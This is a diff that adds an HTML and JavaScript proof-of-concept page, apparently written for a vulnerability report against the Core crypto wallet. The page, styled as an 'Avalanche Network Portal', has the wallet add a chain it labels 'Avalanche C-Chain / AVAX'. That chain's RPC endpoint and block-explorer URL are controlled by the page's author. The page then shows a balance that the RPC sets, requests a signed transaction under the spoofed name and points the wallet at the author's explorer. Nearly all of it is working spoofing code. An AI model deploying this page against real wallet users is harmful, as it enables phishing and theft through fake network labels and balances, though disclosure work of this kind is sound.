@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>tess</title>
+<style>
+  :root{ --bg:#0f1115; --fg:#eef2f6; --mut:#9aa7b4; --ln:#262b33; --red:#e84142; --gold:#f4b740; --grn:#2ecc71; }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.6 Inter,Segoe UI,Arial,sans-serif;
+    padding:28px 20px;text-align:right;direction:ltr}
+  main{max-width:600px;margin-left:auto}
+  .brand{display:flex;align-items:center;gap:10px;justify-content:flex-end;color:var(--red);font-weight:700;letter-spacing:.3px}
+  .brand .dot{width:10px;height:10px;border-radius:50%;background:var(--red)}
+  h1{font-size:19px;margin:10px 0 2px}
+  .sub{color:var(--mut);font-size:13px;margin:0 0 20px}
+  .panel{border:1px solid var(--ln);border-radius:14px;padding:18px;margin-bottom:16px;background:#141821}
+  .field{margin:10px 0}
+  .field span{display:block;color:var(--mut);font-size:12px;margin-bottom:4px}
+  input{width:100%;background:#0c0f14;color:var(--fg);border:1px solid var(--ln);border-radius:9px;
+    padding:10px 12px;font:13px Menlo,monospace;text-align:right}
+  .actions{display:flex;flex-wrap:wrap;gap:8px;justify-content:flex-end;margin-top:6px}
+  .btn{border:0;border-radius:10px;padding:11px 16px;font:600 13px Inter;cursor:pointer}
+  .primary{background:var(--red);color:#fff}
+  .ghost{background:#1b212b;color:var(--fg);border:1px solid var(--ln)}
+  .btn:disabled{opacity:.5;cursor:not-allowed}
+  .steps div{padding:9px 0;border-bottom:1px solid var(--ln);color:var(--mut);font-size:13px}
+  .steps div:last-child{border:0}
+  .steps .done{color:var(--fg)}
+  .steps .done b{color:var(--gold)}
+  .k{color:var(--mut)} .g{color:var(--grn)} .r{color:var(--red)} .y{color:var(--gold)}
+  pre{background:#0c0f14;border:1px solid var(--ln);border-radius:9px;padding:12px;margin:0;
+    font:12px/1.6 Menlo,monospace;color:#cdd8e2;white-space:pre-wrap;text-align:left;direction:ltr;
+    min-height:90px;max-height:240px;overflow:auto}
+</style>
+</head>
+<body>
+<main>
+  <div class="brand"><span>Avalanche Network Portal</span><span class="dot"></span></div>
+  <h1>Add Avalanche C-Chain to Core</h1>
+  <p class="sub">One click to connect to the Avalanche C-Chain and view your AVAX balance.</p>
+
+  <div class="panel">
+    <div class="field"><span>RPC endpoint</span><input id="rpc" placeholder="https://xxxx.ngrok-free.app" /></div>
+    <div class="field"><span>Chain ID</span><input id="chainId" value="43999" /></div>
+    <div class="field"><span>Network name</span><input id="name" value="Avalanche C-Chain" /></div>
+    <div class="field"><span>Currency symbol</span><input id="symbol" value="AVAX" /></div>
+    <div class="field"><span>Block explorer</span><input id="explorer" value="https://justluckidzz.github.io/poc" /></div>
+    <div class="field"><span>Send to</span><input id="to" value="0x70997970C51812dc3A010C7d01b50e0d17dc79C8" /></div>
+    <div class="actions">
+      <button class="btn ghost" id="add">Add network</button>
+      <button class="btn ghost" id="switch">Switch</button>
+      <button class="btn ghost" id="bal">Balance</button>
+      <button class="btn ghost" id="tx">Send 0.1 AVAX</button>
+      <button class="btn ghost" id="exp">Explorer link</button>
+      <button class="btn primary" id="run">Run full PoC</button>
+    </div>
+  </div>
+
+  <div class="panel steps">
+    <div id="sA">A · Core labels chain 43999 as a trusted network</div>
+    <div id="sB">B · Balance shown by Core is set by this RPC</div>
+    <div id="sC">C · Transaction approved under the spoofed network name</div>
+    <div id="sD">D · Core opens this site's explorer URL</div>
+  </div>
+
+  <div class="panel"><pre id="log">Ready.</pre></div>
+</main>
+
+<script>
+  const el = (id) => document.getElementById(id);
+  const log = el('log');
+  let account = null, lastHash = null;
+
+  function say(msg, cls){
+    const line = cls ? '<span class="'+cls+'">'+msg+'</span>' : msg;
+    log.innerHTML = (log.textContent === 'Ready.' ? '' : log.innerHTML + '\n') + line;
+    log.scrollTop = log.scrollHeight;
+  }
+  function done(id, text){ const e = el(id); e.className = 'done'; e.innerHTML = e.id.slice(1) + ' · ' + text; }
+  function eip(){ const p = window.avalanche || window.ethereum; if(!p) throw new Error('Open in a browser with Core.'); return p; }
+  function hex(){ return '0x' + parseInt(el('chainId').value, 10).toString(16); }
+  function avax(h){ try{ const v = BigInt(h), b = 10n**18n;
+      const w = (v/b).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','), f = (v%b).toString().padStart(18,'0').slice(0,4).replace(/0+$/,'');
+      return f ? w+'.'+f : w; } catch { return '0'; } }
+  function fund(){ const amt = '0x' + (BigInt(1337)*(10n**18n)).toString(16);
+    return "curl -s -X POST http://127.0.0.1:8545 -H 'content-type: application/json' --data '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"anvil_setBalance\",\"params\":[\""+(account||'<account>')+"\",\""+amt+"\"]}'"; }
+
+  async function connect(){ if(account) return account;
+    const a = await eip().request({ method:'eth_requestAccounts' }); account = a && a[0]; say('Connected ' + account, 'k'); return account; }
+
+  async function addNetwork(){
+    const name = el('name').value, sym = el('symbol').value;
+    const params = { chainId: hex(), chainName: name,
+      nativeCurrency: { name: sym, symbol: sym, decimals: 18 },
+      rpcUrls: [el('rpc').value.trim()], blockExplorerUrls: [el('explorer').value.trim()],
+      iconUrls: ['https://cryptologos.cc/logos/avalanche-avax-logo.png'] };
+    say('Requesting to add "' + name + ' / ' + sym + '" (chainId ' + parseInt(params.chainId,16) + ')', 'y');
+    const r = await eip().request({ method:'wallet_addEthereumChain', params:[params] });
+    say('Added. Core now trusts this network.', 'g');
+    done('sA', 'Core shows chain 43999 as <b>' + name + ' / ' + sym + '</b>');
+  }
+  async function switchNetwork(){ await connect();
+    await eip().request({ method:'wallet_switchEthereumChain', params:[{ chainId: hex() }] });
+    say('Switched to ' + el('name').value, 'g'); }
+  async function readBalance(){ await connect();
+    const h = await eip().request({ method:'eth_getBalance', params:[account, 'latest'] });
+    say('Core balance: ' + avax(h) + ' ' + el('symbol').value, 'g');
+    if(h === '0x0' || !h){ say('Balance is 0 — set it from a terminal, then press Balance again:', 'y'); say(fund(), 'k'); }
+    else done('sB', 'Core shows <b>' + avax(h) + ' ' + el('symbol').value + '</b> returned by this RPC'); }
+  async function sendTx(){ await connect();
+    say('Requesting signature for 0.1 ' + el('symbol').value + ' on "' + el('name').value + '"', 'y');
+    try{
+      lastHash = await eip().request({ method:'eth_sendTransaction', params:[{ from:account, to:el('to').value, value:'0x16345785d8a0000' }] });
+      say('Transaction hash ' + lastHash, 'g');
+      done('sC', 'Tx approved under label <b>' + el('name').value + '</b>');
+    }catch(e){ const m = (e.message||'')+''; say(m || e.code, 'r');
+      if(/insufficient|funds/i.test(m)){ say('Fund the account first, then retry:', 'y'); say(fund(), 'k'); } throw e; } }
+  function explorer(){
+    const base = el('explorer').value.trim().replace(/\/+$/,'');
+    const url = base + '/address/' + (account || '<account>');
+    say('Explorer URL Core will open: ' + url, 'y');
+    say('In Core: Portfolio → tap AVAX → "View on explorer".', 'k');
+    done('sD', 'Core opens <b>' + url + '</b>'); }
+
+  el('add').onclick   = () => addNetwork().catch(e => say(e.message || e.code, 'r'));
+  el('switch').onclick= () => switchNetwork().catch(e => say(e.message || e.code, 'r'));
+  el('bal').onclick   = () => readBalance().catch(e => say(e.message || e.code, 'r'));
+  el('tx').onclick    = () => sendTx().catch(e => say(e.message || e.code, 'r'));
+  el('exp').onclick   = explorer;
+  el('run').onclick   = async () => {
+    if(!el('rpc').value.trim()){ say('Enter the RPC endpoint first.', 'y'); return; }
+    try{ await addNetwork(); await switchNetwork(); await readBalance(); await sendTx(); explorer();
+      say('PoC complete — capture Core screens for A, B, C, D.', 'g'); }
+    catch(e){ say('Stopped: ' + (e.message || e.code), 'r'); } };
+</script>
+</body>
+</html>
